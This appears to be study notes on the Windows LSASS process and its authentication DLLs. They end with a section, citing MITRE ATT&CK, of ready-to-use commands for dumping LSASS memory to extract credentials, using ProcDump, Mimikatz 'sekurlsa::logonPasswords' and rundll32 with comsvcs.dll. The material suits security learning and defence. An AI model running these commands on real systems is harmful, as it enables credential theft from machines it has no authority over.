### 1.0 Local Security Authority Subsystem Service
LSASS is a process rather than a file. As we can see from `Task Manager`, it runs as SYSTEM.  
![](https://i.imgur.com/KLds609.png)

According to Microsoft's website: 

> The LSA security subsystem provides services to both the kernel mode and user mode for validating access to objects, checking user privileges, and generating audit messages.

![](https://i.imgur.com/E7SRmLB.png)

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN

I noticed LSA and LSASS from the above website, but I simply had no clue what they were. A quick description of LSA and LSASS was found on StackExchange:

> There is "LSA" the concept, and "lsass.exe," a process that implements many of the functions of LSA.

https://superuser.com/questions/1370871/what-is-the-relation-between-lsa-and-lsass-in-windows

---

### Authentication-Related Files

| **File Name**    | **Description**                                                                                                                                        |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Netlogon.dll** | Manages the computer's secure channel to a domain controller, passing credentials securely and handling replication for Windows NT domain controllers. |
| **Msv1_0.dll**   | Implements the NTLM authentication protocol for clients that don’t use Kerberos.                                                                       |
| **Schannel.dll** | Provides Secure Sockets Layer (SSL) authentication over encrypted channels.                                                                            |
| **Kerberos.dll** | Implements the Kerberos v5 authentication protocol.                                                                                                    |
| **Kdcsvc.dll**   | Kerberos Key Distribution Center (KDC) service, responsible for issuing ticket-granting tickets.                                                       |
| **Lsasrv.dll**   | The Local Security Authority (LSA) server service, which enforces security policies.                                                                   |
| **Samsrv.dll**   | Manages the Security Accounts Manager (SAM), storing local accounts and enforcing policies.                                                            |
| **Ntdsa.dll**    | The directory service module supporting Windows replication and LDAP, managing data partitions.                                                        |
| **Secur32.dll**  | A multiple authentication provider that integrates various authentication components.                                                                  |

---

### 1.1 LSASS Memory Dump

According to [MITRE](https://attack.mitre.org/techniques/T1003/001/), credentials in the LSASS process memory can be dumped in many ways.

#### 1.1.1 ProcDump
```bash
procdump -ma lsass.exe lsass_dump
```

#### 1.1.2 Mimikatz
```bash
sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords
```

#### 1.1.3 Built-in Windows Tools - comsvcs.dll
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
```

#### 1.1.4 Task Manager
![](https://i.imgur.com/EnEyDrY.png)

#### 1.1.5 Process Explorer
![](https://i.imgur.com/5felLNA.png)

---
